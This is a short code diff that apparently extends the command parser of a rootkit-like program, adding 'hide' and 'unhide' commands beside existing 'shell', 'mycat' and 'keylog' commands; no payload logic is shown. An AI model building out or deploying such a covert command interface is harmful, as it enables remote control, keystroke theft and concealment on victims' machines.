@@ -11,8 +11,16 @@ static u32 get_arg_len(char* string) {
 
 command_t parse_command(char* data)
 {
-    char* command_strings[COMMAND_NUM] = {"shell \0", "mycat \0", "keylog\0"};
-    command_t commands[COMMAND_NUM] = {RUN, CAT, KEYLOG};
+    char* command_strings[COMMAND_NUM] = {
+        "shell \0", "mycat \0",
+        "keylog\0", "hide \0",
+        "unhide \0"
+      };
+    command_t commands[COMMAND_NUM] = {
+        RUN, CAT,
+        KEYLOG, HIDE,
+        UNHIDE
+        };
     u32 i, shift, j;
 
 
@@ -36,8 +44,7 @@ command_t parse_command(char* data)
         }
         return commands[i];
         
-        
-
+    
     }
 
 
